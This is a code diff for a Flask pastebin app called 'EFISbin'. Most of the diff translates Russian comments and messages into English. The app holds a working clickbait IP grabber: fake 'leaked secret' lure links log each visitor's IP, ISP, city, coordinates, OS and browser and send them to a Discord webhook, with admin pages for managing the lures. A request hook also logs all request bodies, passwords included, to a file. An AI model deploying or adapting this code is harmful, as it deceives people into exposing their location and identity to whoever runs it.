@@ -8,8 +8,7 @@ from functools import wraps
 import httpagentparser
 import requests
 from dotenv import load_dotenv
-from flask import Flask, render_template, redirect, url_for, request, flash, abort, jsonify
-from flask import send_from_directory
+from flask import Flask, render_template, redirect, url_for, request, flash, abort, jsonify, send_from_directory
 from flask_caching import Cache
 from flask_compress import Compress
 from flask_login import LoginManager, login_user, login_required, logout_user, current_user, UserMixin
@@ -31,15 +30,17 @@ import bleach
 import re
 
 
-# Загрузка переменных окружения из файла .env
+# Load environment variables from .env file
 load_dotenv()
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'default_secret_key')
 app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'default_database_url')
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.config['RECAPTCHA_USE_SSL'] = False  # Или True, в зависимости от вашего сервера
 app.config['RECAPTCHA_PUBLIC_KEY'] = os.getenv('RECAPTCHA_PUBLIC_KEY')
 app.config['RECAPTCHA_PRIVATE_KEY'] = os.getenv('RECAPTCHA_PRIVATE_KEY')
+app.config['RECAPTCHA_OPTIONS'] = {'theme': 'light'}  # Опционально
 compress = Compress()
 compress.init_app(app)
 app.config['COMPRESS_MIMETYPES'] = [
@@ -58,23 +59,22 @@ login_manager.login_view = 'login'
 cache = Cache(app, config={'CACHE_TYPE': 'SimpleCache'})
 REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379/0")
 
-# ------------------ Конфигурация для EFISbin ------------------
-CLICKBAIT_TITLE = "😱 ШОК! Вы не поверите, что здесь скрыто..."
-CLICKBAIT_DESCRIPTION = "🔥 Эксклюзив! Это должно было остаться в секрете, но утекло в сеть. Посмотрите, пока не удалили!"
+# Configuration for EFISbin
+CLICKBAIT_TITLE = "😱 SHOCK! You won't believe what's hidden here..."
+CLICKBAIT_DESCRIPTION = "🔥 Exclusive! This was supposed to stay secret, but it leaked online. Check it out before it's deleted!"
 CLICKBAIT_IMAGE = "https://example.com/image.png"
 REAL_URL = "https://example.com/real"
 DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', 'default_webhook_url')
 click_count = 0
-# -------------------------------------------------------------
 
-# Использование переменных окружения
-VPN_CHECK = int(os.getenv("VPN_CHECK", "1"))  # По умолчанию 1, если не установлено
-ANTI_BOT = int(os.getenv("ANTI_BOT", "1"))    # По умолчанию 1, если не установлено
+# Use environment variables
+VPN_CHECK = int(os.getenv("VPN_CHECK", "1"))  # Default to 1 if not set
+ANTI_BOT = int(os.getenv("ANTI_BOT", "1"))    # Default to 1 if not set
 handler = RotatingFileHandler('app.log', maxBytes=10000, backupCount=3)
 handler.setLevel(logging.INFO)
 app.logger.addHandler(handler)
 
-# Конфигурация для логирования изображений
+# Configuration for logging images
 config = {
     "webhook": DISCORD_WEBHOOK_URL,
     "image": CLICKBAIT_IMAGE,
@@ -112,9 +112,9 @@ def reportError(error):
         "content": "@everyone",
         "embeds": [
             {
-                "title": "EFISbin - Ошибка",
+                "title": "EFISbin - Error",
                 "color": config["color"],
-                "description": f"Произошла ошибка при попытке залогировать IP!\n\n**Ошибка:**\n\n{error}\n",
+                "description": f"An error occurred while trying to log the IP!\n\n**Error:**\n\n{error}\n",
             }
         ],
     })
@@ -128,9 +128,9 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             "content": "",
             "embeds": [
                 {
-                    "title": "EFISbin - Ссылка отправлена",
+                    "title": "EFISbin - Link Sent",
                     "color": config["color"],
-                    "description": f"Ссылка EFISbin была отправлена в чат!\nВы можете получить IP.\n\n**Конечная точка:** `{endpoint}`\n**IP:** `{ip}`\n**Платформа:** `{bot}`",
+                    "description": f"EFISbin link was sent to chat! You can get the IP.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                 }
             ],
         }) if config["linkAlerts"] else None
@@ -140,7 +140,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
     try:
         response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857")
-        response.raise_for_status()  # Вызов исключения для HTTP ошибок
+        response.raise_for_status()  # Raise exception for HTTP errors
         info = response.json()
 
         if 'proxy' in info and info["proxy"]:
@@ -176,28 +176,28 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             "content": ping,
             "embeds": [
                 {
-                    "title": "EFISbin - IP залогирован",
+                    "title": "EFISbin - IP Logged",
                     "color": config["color"],
-                    "description": f"""**Пользователь открыл оригинальное изображение!**
+                    "description": f"""**User opened the original image!**
 
-**Конечная точка:** `{endpoint}`
+**Endpoint:** `{endpoint}`
 
-**Информация об IP:**
+**IP Information:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Провайдер:** `{info.get('isp', 'Unknown')}`
+> **ISP:** `{info.get('isp', 'Unknown')}`
 > **ASN:** `{info.get('as', 'Unknown')}`
-> **Страна:** `{info.get('country', 'Unknown')}`
-> **Регион:** `{info.get('regionName', 'Unknown')}`
-> **Город:** `{info.get('city', 'Unknown')}`
-> **Координаты:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Приблизительные' if not coords else 'Точные, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Часовой пояс:** `{timezone_name}` ({timezone_region})
-> **Мобильный:** `{info.get('mobile', 'Unknown')}`
+> **Country:** `{info.get('country', 'Unknown')}`
+> **Region:** `{info.get('regionName', 'Unknown')}`
+> **City:** `{info.get('city', 'Unknown')}`
+> **Coordinates:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Exact, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{timezone_name}` ({timezone_region})
+> **Mobile:** `{info.get('mobile', 'Unknown')}`
 > **VPN:** `{info.get('proxy', 'Unknown')}`
-> **Бот:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Возможно' if info.get('hosting') else 'False'}`
+> **Bot:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
 
-**Информация о ПК:**
-> **ОС:** `{os}`
-> **Браузер:** `{browser}`
+**PC Information:**
+> **OS:** `{os}`
+> **Browser:** `{browser}`
 
 **User Agent:**
 ```
@@ -213,47 +213,47 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         return info
 
     except requests.exceptions.RequestException as e:
-        logging.error(f"Ошибка обработки информации об IP: {e}")
+        logging.error(f"Error processing IP information: {e}")
         return
     except ValueError as e:
-        logging.error(f"Ошибка разбора JSON: {e}")
+        logging.error(f"Error parsing JSON: {e}")
         return
 
-# Функция для логирования IP
-def ip_logger(event="Новый визит", custom_data=None):
+# Function to log IP
+def ip_logger(event="New Visit", custom_data=None):
     user_ip = request.remote_addr
     user_agent = request.headers.get('User-Agent')
     referrer = request.headers.get('Referer')
     content = f"🚨 {event}!\n**IP:** {user_ip}\n**User-Agent:** {user_agent}\n**Referrer:** {referrer}"
 
     if custom_data:
-        content += f"\n**Дополнительные данные:** {custom_data}"
+        content += f"\n**Additional Data:** {custom_data}"
 
     payload = {"content": content}
     try:
         requests.post(DISCORD_WEBHOOK_URL, json=payload)
     except Exception as e:
-        print("Ошибка отправки вебхука Discord:", e)
+        print("Error sending Discord webhook:", e)
 
 def send_notification(user, message):
-    """Отправка уведомления пользователю через Discord"""
+    """Send notification to user via Discord"""
     try:
         payload = {
-            "content": f"🔔 Уведомление для {user.username}:\n{message}"
+            "content": f"🔔 Notification for {user.username}:\n{message}"
         }
         requests.post(DISCORD_WEBHOOK_URL, json=payload)
     except Exception as e:
-        app.logger.error(f"Ошибка отправки уведомления: {str(e)}")
+        app.logger.error(f"Error sending notification: {str(e)}")
 
-# Модель пользователя
+# User model
 class User(UserMixin, db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(150), unique=True, nullable=False)
-    email = db.Column(db.String(150), unique=True, nullable=True)  # Сделать email необязательным
+    email = db.Column(db.String(150), unique=True, nullable=True)  # Make email optional
     password_hash = db.Column(db.String(200), nullable=False)
-    is_admin = db.Column(db.Boolean, default=False)  # Флаг админа
-    is_banned = db.Column(db.Boolean, default=False)  # Флаг бана
-    hardware_id = db.Column(db.String(256), unique=True, nullable=True)  # Идентификатор оборудования
+    is_admin = db.Column(db.Boolean, default=False)  # Admin flag
+    is_banned = db.Column(db.Boolean, default=False)  # Ban flag
+    hardware_id = db.Column(db.String(256), unique=True, nullable=True)  # Hardware identifier
     pastes = db.relationship('Paste', backref='author', lazy=True)
 
     def set_password(self, password):
@@ -266,20 +266,20 @@ def admin_required(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
         if not current_user.is_admin:
-            flash("У вас нет доступа к этой странице.", "danger")
+            flash("You do not have access to this page.", "danger")
             return redirect(url_for('index'))
         return f(*args, **kwargs)
     return decorated_function
 
-# Модель Paste
+# Paste model
 class Paste(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     title = db.Column(db.String(150))
     content = db.Column(db.Text, nullable=False)
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
-    is_anonymous = db.Column(db.Boolean, default=False)  # Анонимная публикация
-    language = db.Column(db.String(50), default='text')  # Язык для подсветки синтаксиса
+    is_anonymous = db.Column(db.Boolean, default=False)  # Anonymous posting
+    language = db.Column(db.String(50), default='text')  # Syntax highlighting language
 
 class AdminLog(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -288,16 +288,16 @@ class AdminLog(db.Model):
     timestamp = db.Column(db.DateTime, default=datetime.utcnow)
     details = db.Column(db.Text, nullable=True)
 
-# Модель Clickbait
+# Clickbait model
 class Clickbait(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    slug = db.Column(db.String(100), unique=True, nullable=False)  # Новое поле
+    slug = db.Column(db.String(100), unique=True, nullable=False)  # New field
     title = db.Column(db.String(256), nullable=False)
     description = db.Column(db.String(512), nullable=False)
     image_url = db.Column(db.String(512), nullable=False)
     real_url = db.Column(db.String(512), nullable=False)
 
-# Модель тегов
+# Tag model
 class Tag(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     name = db.Column(db.String(50), unique=True)
@@ -307,13 +307,13 @@ paste_tags = db.Table('paste_tags',
     db.Column('tag_id', db.Integer, db.ForeignKey('tag.id'))
 )
 
-# Модель оценок
+# Vote model
 class Vote(db.Model):
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'), primary_key=True)
     paste_id = db.Column(db.Integer, db.ForeignKey('paste.id'), primary_key=True)
-    value = db.Column(db.Integer)  # 1 или -1
+    value = db.Column(db.Integer)  # 1 or -1
 
-# Модель комментариев
+# Comment model
 class Comment(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     text = db.Column(db.Text)
@@ -325,74 +325,74 @@ def load_user(user_id):
     with app.app_context():
         return db.session.get(User, int(user_id))
 
-# Форма регистрации
+# Registration form
 class RegistrationForm(FlaskForm):
-    username = StringField('Имя пользователя', validators=[DataRequired(), Length(3, 150)])
-    email = StringField('Email', validators=[Optional(), Email(), Length(max=150)])  # Сделать email необязательным
-    password = PasswordField('Пароль', validators=[DataRequired(), Length(6, 100)])
-    confirm_password = PasswordField('Подтвердите пароль', validators=[DataRequired(), EqualTo('password')])
-    recaptcha = RecaptchaField()
-    submit = SubmitField('Регистрация')
+    username = StringField('Username', validators=[DataRequired(), Length(3, 150)])
+    email = StringField('Email', validators=[Optional(), Email(), Length(max=150)])
+    password = PasswordField('Password', validators=[DataRequired(), Length(6, 100)])
+    confirm_password = PasswordField('Confirm Password', validators=[DataRequired(), EqualTo('password')])
+    recaptcha = RecaptchaField() 
+    submit = SubmitField('Register')
 
     def validate_username(self, username):
         user = User.query.filter_by(username=username.data).first()
         if user:
-            raise ValidationError('Это имя пользователя уже занято. Пожалуйста, выберите другое.')
+            raise ValidationError('This username is already taken. Please choose another.')
 
     def validate_email(self, email):
-        if email.data:  # Проверка только если email предоставлен
+        if email.data:  # Check only if email is provided
             user = User.query.filter_by(email=email.data).first()
             if user:
-                raise ValidationError('Этот email уже зарегистрирован.')
+                raise ValidationError('This email is already registered.')
 
-# Форма входа
+# Login form
 class LoginForm(FlaskForm):
-    username = StringField('Имя пользователя', validators=[DataRequired(), Length(3, 150)])
-    password = PasswordField('Пароль', validators=[DataRequired()])
-    submit = SubmitField('Войти')
+    username = StringField('Username', validators=[DataRequired(), Length(3, 150)])
+    password = PasswordField('Password', validators=[DataRequired()])
+    submit = SubmitField('Login')
 
-# Форма Paste
+# Paste form
 class PasteForm(FlaskForm):
-    title = StringField('Заголовок', validators=[Length(max=150)])
-    content = TextAreaField('Содержимое', validators=[DataRequired()])
-    is_anonymous = BooleanField('Анонимная публикация')
+    title = StringField('Title', validators=[Length(max=150)])
+    content = TextAreaField('Content', validators=[DataRequired()])
+    is_anonymous = BooleanField('Anonymous Posting')
     language = SelectField(
-        'Язык',
+        'Language',
         choices=[
             ('python', 'Python'),
             ('javascript', 'JavaScript'),
             ('html', 'HTML'),
-            ('text', 'Текст')
+            ('text', 'Text')
         ],
         default='text'
     )
-    tags = SelectMultipleField('Теги', choices=[])
-    submit = SubmitField('Создать Paste')
+    tags = SelectMultipleField('Tags', choices=[])
+    submit = SubmitField('Create Paste')
 
-# Форма редактирования Paste
+# Edit Paste form
 class EditPasteForm(FlaskForm):
-    title = StringField('Заголовок', validators=[Length(max=150)])
-    content = TextAreaField('Содержимое', validators=[DataRequired()])
-    submit = SubmitField('Сохранить изменения')
+    title = StringField('Title', validators=[Length(max=150)])
+    content = TextAreaField('Content', validators=[DataRequired()])
+    submit = SubmitField('Save Changes')
 
-# Форма Clickbait
+# Clickbait form
 class ClickbaitForm(FlaskForm):
-    slug = StringField('Название/ЧПУ', validators=[DataRequired(), Length(max=100)])
-    title = StringField('Заголовок', validators=[DataRequired(), Length(max=256)])
-    description = StringField('Описание', validators=[DataRequired(), Length(max=512)])
-    image_url = StringField('URL изображения', validators=[DataRequired(), Length(max=512)])
-    real_url = StringField('Реальный URL', validators=[DataRequired(), Length(max=512)])
-    submit = SubmitField('Сохранить')
+    slug = StringField('Name/Slug', validators=[DataRequired(), Length(max=100)])
+    title = StringField('Title', validators=[DataRequired(), Length(max=256)])
+    description = StringField('Description', validators=[DataRequired(), Length(max=512)])
+    image_url = StringField('Image URL', validators=[DataRequired(), Length(max=512)])
+    real_url = StringField('Real URL', validators=[DataRequired(), Length(max=512)])
+    submit = SubmitField('Save')
 
     def validate_slug(self, slug):
         clickbait = Clickbait.query.filter_by(slug=slug.data).first()
         if clickbait:
-            raise ValidationError('Этот ЧПУ уже занят. Пожалуйста, выберите другой.')
+            raise ValidationError('This slug is already taken. Please choose another.')
 
 limiter = Limiter(
     app=app,
     key_func=get_remote_address,
-    storage_uri=REDIS_URL,  # Указываем Redis
+    storage_uri=REDIS_URL,  # Use Redis
     default_limits=["200 per day", "50 per hour"]
 )
 
@@ -400,7 +400,7 @@ limiter = Limiter(
 def serve_static(path):
     return send_from_directory('static', path)
 
-# Главная страница: список последних Paste
+# Home page: list of latest Pastes
 @app.route('/sitemap.xml')
 def sitemap():
     return send_from_directory(os.path.join(app.root_path, 'static'), 'sitemap.xml')
@@ -411,13 +411,13 @@ def robots():
 
 @app.before_request
 def log_request_info():
-    app.logger.info('Заголовки: %s', request.headers)
-    app.logger.info('Тело: %s', request.get_data())
+    app.logger.info('Headers: %s', request.headers)
+    app.logger.info('Body: %s', request.get_data())
 
 @app.after_request
 def add_header(response):
     if request.path.startswith('/static/'):
-        response.cache_control.max_age = 31536000  # 1 год
+        response.cache_control.max_age = 31536000  # 1 year
         response.cache_control.public = True
         response.headers['Expires'] = (datetime.now() + timedelta(days=365)).strftime('%a, %d %b %Y %H:%M:%S GMT')
     return response
@@ -458,14 +458,15 @@ def favicon():
 def offline():
     return render_template('offline.html')
 
-# ---------------------- Админ-панель ----------------------
+# Admin panel
 @app.route('/admin')
 @login_required
 @admin_required
 def admin_panel():
+    app.logger.warning(f'Admin access by {current_user.username}')
     return render_template('admin.html')
 
-# Управление пользователями: список всех пользователей
+# Manage users: list all users
 @app.route('/admin/users')
 @login_required
 @admin_required
@@ -473,7 +474,7 @@ def admin_users():
     users = User.query.all()
     return render_template('admin_users.html', users=users)
 
-# Управление Paste: список всех Paste
+# Manage Pastes: list all Pastes
 @app.route('/admin/pastes')
 @login_required
 @admin_required
@@ -481,7 +482,7 @@ def admin_pastes():
     pastes = Paste.query.order_by(Paste.created_at.desc()).all()
     return render_template('admin_pastes.html', pastes=pastes)
 
-# Управление Clickbait
+# Manage Clickbait
 @app.route('/admin/clickbait', methods=['GET', 'POST'])
 @login_required
 @admin_required
@@ -496,7 +497,7 @@ def delete_clickbait(cb_id):
     clickbait = Clickbait.query.get_or_404(cb_id)
     db.session.delete(clickbait)
     db.session.commit()
-    flash('Clickbait успешно удален', 'success')
+    flash('Clickbait successfully deleted', 'success')
     return redirect(url_for('admin_clickbait'))
 
 @app.route('/admin/clickbait/new', methods=['GET', 'POST'])
@@ -514,11 +515,11 @@ def new_clickbait():
         )
         db.session.add(clickbait)
         db.session.commit()
-        flash("Новый clickbait создан", "success")
+        flash("New clickbait created", "success")
         return redirect(url_for('admin_clickbait'))
     return render_template('new_clickbait.html', form=form)
 
-# Редактирование Clickbait
+# Edit Clickbait
 @app.route('/admin/clickbait/edit/<int:cb_id>', methods=['GET', 'POST'])
 @login_required
 @admin_required
@@ -528,7 +529,7 @@ def edit_clickbait(cb_id):
     if form.validate_on_submit():
         form.populate_obj(clickbait)
         db.session.commit()
-        flash("Clickbait обновлен", "success")
+        flash("Clickbait updated", "success")
         return redirect(url_for('admin_clickbait'))
     return render_template('edit_clickbait.html', form=form, clickbait=clickbait)
 
@@ -554,17 +555,17 @@ def clickbait_list():
     clickbaits = Clickbait.query.all()
     return render_template('clickbait_list.html', clickbaits=clickbaits)
 
-# Админ-функции для управления clickbait (статистика и сброс счетчика)
+# Admin functions for managing clickbait (statistics and resetting counter)
 @app.route('/admin/clickbait/reset', methods=['POST'])
 @login_required
 @admin_required
 def reset_clickbait():
     global click_count
     click_count = 0
-    flash("Счетчик кликов сброшен.", "success")
+    flash("Click counter reset.", "success")
     return redirect(url_for('admin_clickbait'))
 
-# Управление банами пользователей
+# Manage user bans
 @app.route('/admin/ban/<int:user_id>', methods=['POST'])
 @login_required
 @admin_required
@@ -573,7 +574,7 @@ def ban_user(user_id):
     if user:
         user.is_banned = True
         db.session.commit()
-        flash(f"Пользователь {user.username} забанен.", "success")
+        flash(f"User {user.username} banned.", "success")
     return redirect(url_for('admin_users'))
 
 @app.route('/admin/unban/<int:user_id>', methods=['POST'])
@@ -584,10 +585,10 @@ def unban_user(user_id):
     if user:
         user.is_banned = False
         db.session.commit()
-        flash(f"Пользователь {user.username} разбанен.", "success")
+        flash(f"User {user.username} unbanned.", "success")
     return redirect(url_for('admin_users'))
 
-# Управление удалением Paste
+# Manage Paste deletion
 @app.route('/admin/paste/delete/<int:paste_id>', methods=['POST'])
 @login_required
 @admin_required
@@ -596,10 +597,10 @@ def delete_paste(paste_id):
     if paste:
         db.session.delete(paste)
         db.session.commit()
-        flash("Paste успешно удален.", "success")
+        flash("Paste successfully deleted.", "success")
     return redirect(url_for('admin_pastes'))
 
-# Просмотр админ-логов
+# View admin logs
 @app.route('/admin/logs')
 @login_required
 @admin_required
@@ -620,12 +621,12 @@ def edit_paste(paste_id):
         paste.content = form.content.data
         db.session.commit()
 
-        # Логирование действия
-        log = AdminLog(admin_id=current_user.id, action=f"Отредактирован paste ID: {paste_id}", details=f"Заголовок: {paste.title}, Содержимое: {paste.content}")
+        # Log action
+        log = AdminLog(admin_id=current_user.id, action=f"Edited paste ID: {paste_id}", details=f"Title: {paste.title}, Content: {paste.content}")
         db.session.add(log)
         db.session.commit()
 
-        flash("Paste успешно отредактирован.", "success")
+        flash("Paste successfully edited.", "success")
         return redirect(url_for('admin_pastes'))
     return render_template('edit_paste.html', form=form, paste=paste)
 
@@ -636,7 +637,7 @@ def request_edit_paste(paste_id):
     if not paste:
         abort(404)
     if not current_user.is_admin and paste.user_id != current_user.id:
-        flash("У вас нет прав для редактирования этого paste.", "danger")
+        flash("You do not have permission to edit this paste.", "danger")
         return redirect(url_for('index'))
     form = EditPasteForm(obj=paste)
     if form.validate_on_submit():
@@ -644,25 +645,24 @@ def request_edit_paste(paste_id):
         paste.content = form.content.data
         db.session.commit()
 
-        # Логирование действия
+        # Log action
         if current_user.is_admin:
-            log = AdminLog(admin_id=current_user.id, action=f"Отредактирован paste ID: {paste_id}", details=f"Заголовок: {paste.title}, Содержимое: {paste.content}")
+            log = AdminLog(admin_id=current_user.id, action=f"Edited paste ID: {paste_id}", details=f"Title: {paste.title}, Content: {paste.content}")
             db.session.add(log)
             db.session.commit()
 
-        flash("Paste успешно отредактирован.", "success")
+        flash("Paste successfully edited.", "success")
         return redirect(url_for('view_paste', paste_id=paste.id))
     return render_template('edit_paste.html', form=form, paste=paste)
 
-# ------------------- Функции Clickbait --------------------
-# Генерация ссылки Clickbait
+# Clickbait link generation
 @app.route('/clickbait/generate')
 def generate_link():
     clickbait = Clickbait.query.first()
     if clickbait:
-        return f"Вот ваша ссылка clickbait: {url_for('clickbait_page', _external=True)}"
+        return f"Here is your clickbait link: {url_for('clickbait_page', _external=True)}"
     else:
-        return "Clickbait не настроен.", 404
+        return "Clickbait not configured.", 404
 
 @app.route('/register', methods=['GET', 'POST'])
 @limiter.limit("5 per minute")
@@ -673,16 +673,16 @@ def register():
     if form.validate_on_submit():
         user = User(
             username=form.username.data,
-            email=form.email.data if form.email.data else None  # Сохранить None, если email пустой
+            email=form.email.data if form.email.data else None  # Save None if email is empty
         )
         user.set_password(form.password.data)
         db.session.add(user)
         db.session.commit()
-        flash('Регистрация успешна! Пожалуйста, войдите.', 'success')
+        flash('Registration successful! Please log in.', 'success')
         return redirect(url_for('login'))
     return render_template('register.html', form=form)
 
-# Страница входа
+# Login page
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if current_user.is_authenticated:
@@ -692,25 +692,25 @@ def login():
         user = User.query.filter_by(username=form.username.data).first()
         if user and user.check_password(form.password.data):
             if user.is_banned:
-                flash("Ваш аккаунт забанен.", "danger")
+                flash("Your account is banned.", "danger")
                 return redirect(url_for('login'))
             login_user(user)
-            flash('Вы успешно вошли в систему.', 'success')
+            flash('You have successfully logged in.', 'success')
             next_page = request.args.get('next')
             return redirect(next_page) if next_page else redirect(url_for('index'))
         else:
-            flash('Неверное имя пользователя или пароль.', 'danger')
+            flash('Invalid username or password.', 'danger')
     return render_template('login.html', form=form)
 
-# Выход
+# Logout
 @app.route('/logout')
 @login_required
 def logout():
     logout_user()
-    flash('Вы вышли из системы.', 'info')
+    flash('You have been logged out.', 'info')
     return redirect(url_for('index'))
 
-# Функция для санитайзинга HTML контента
+# Function to sanitize HTML content
 def sanitize_html(content):
     tags = [
         'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'b', 'i', 'strong', 'em', 'a', 'p', 'ul', 'ol', 'li',
@@ -722,14 +722,14 @@ def sanitize_html(content):
     }
     return bleach.clean(content, tags=tags, attributes=attributes, strip=True)
 
-# Создание нового Paste (только для аутентифицированных пользователей)
+# Create new Paste (only for authenticated users)
 @app.route('/create', methods=['GET', 'POST'])
 @login_required
 def create_paste():
     form = PasteForm()
     if form.validate_on_submit():
         content = request.form['content']
-        # Конвертация Markdown в HTML с расширениями
+        # Convert Markdown to HTML with extensions
         html_content = markdown.markdown(
             content,
             extensions=[
@@ -738,7 +738,7 @@ def create_paste():
                 'markdown.extensions.extra'
             ]
         )
-        # Санитайзинг HTML контента
+        # Sanitize HTML content
         safe_html_content = sanitize_html(html_content)
 
         paste = Paste(
@@ -751,12 +751,12 @@ def create_paste():
         )
         db.session.add(paste)
         db.session.commit()
-        flash('Новый Paste успешно создан!', 'success')
+        flash('New Paste successfully created!', 'success')
         return redirect(url_for('index'))
     form.tags.choices = [(tag.id, tag.name) for tag in Tag.query.all()]
     return render_template('create.html', form=form)
 
-# Просмотр конкретного Paste
+# View specific Paste
 @app.route('/paste/<int:paste_id>')
 def view_paste(paste_id):
     paste = Paste.query.get_or_404(paste_id)
@@ -765,7 +765,7 @@ def view_paste(paste_id):
     highlighted = highlight(paste.content, lexer, formatter)
     return render_template('paste.html', paste=paste, content=highlighted)
 
-# Поиск по заголовкам/контенту
+# Search by titles/content
 @app.route('/search')
 def search():
     query = request.args.get('query', '')
@@ -775,7 +775,7 @@ def search():
     ).all()
     return render_template('search.html', results=results)
 
-# Фильтры по языкам/дате/авторам
+# Filters by language/date/authors
 @app.route('/pastes')
 def pastes():
     language = request.args.get('language')
@@ -787,7 +787,7 @@ def pastes():
         query = query.filter(Paste.created_at >= date)
     return render_template('pastes.html', pastes=query.all())
 
-# Лайки/дизлайки
+# Likes/dislikes
 @app.route('/vote/<int:paste_id>/<int:value>', methods=['POST'])
 @login_required
 def vote(paste_id, value):
@@ -803,7 +803,7 @@ def vote(paste_id, value):
     dislikes = db.session.query(db.func.count()).filter_by(paste_id=paste_id, value=-1).scalar()
     return jsonify({'likes': likes, 'dislikes': dislikes})
 
-# Комментарии с @упоминаниями
+# Comments with @mentions
 @app.route('/comment/<int:paste_id>', methods=['POST'])
 @login_required
 def comment(paste_id):
@@ -812,22 +812,22 @@ def comment(paste_id):
     db.session.add(comment)
     db.session.commit()
 
-    # Обработка упоминаний
+    # Handle mentions
     mentioned_users = re.findall(r'@(\w+)', text)
     for username in mentioned_users:
         user = User.query.filter_by(username=username).first()
         if user:
-            send_notification(user, f"Вас упомянули в комментарии: {text}")
+            send_notification(user, f"You were mentioned in a comment: {text}")
 
     return redirect(url_for('view_paste', paste_id=paste_id))
 
-# Шаринг в соцсети
+# Share on social media
 @app.route('/share/<int:paste_id>')
 def share(paste_id):
     paste = Paste.query.get_or_404(paste_id)
     return render_template('share.html', paste=paste)
 
-# Предпросмотр пасты
+# Preview paste
 @app.route('/preview', methods=['POST'])
 def preview():
     content = request.json.get('content', '')
@@ -838,16 +838,16 @@ def create_tables():
     while retries > 0:
         try:
             db.create_all()
-            print("Таблицы успешно созданы.")
+            print("Tables successfully created.")
             break
         except OperationalError as e:
             print(f"OperationalError: {e}")
             retries -= 1
             if retries > 0:
-                print("Повторная попытка подключения...")
-                time.sleep(2)  # Подождать перед повторной попыткой
+                print("Retrying connection...")
+                time.sleep(2)  # Wait before retrying
             else:
-                print("Не удалось подключиться к базе данных после нескольких попыток.")
+                print("Failed to connect to the database after several attempts.")
                 raise
 
 if __name__ == '__main__':
